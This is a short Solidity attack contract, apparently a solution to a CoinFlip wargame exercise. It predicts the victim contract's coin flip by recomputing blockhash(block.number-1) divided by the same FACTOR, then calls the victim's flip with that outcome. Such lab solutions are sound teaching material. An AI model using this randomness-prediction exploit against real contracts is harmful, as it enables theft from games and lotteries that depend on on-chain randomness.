pragma solidity ^0.8.0;

import './coinflip.sol';

contract CoinFlipAttack {

    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddr) {
        victimContract = CoinFlip(_victimContractAddr);
    }

    //random on contract is tricky by use the same logic and then sent the same value to the target
    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
    }
}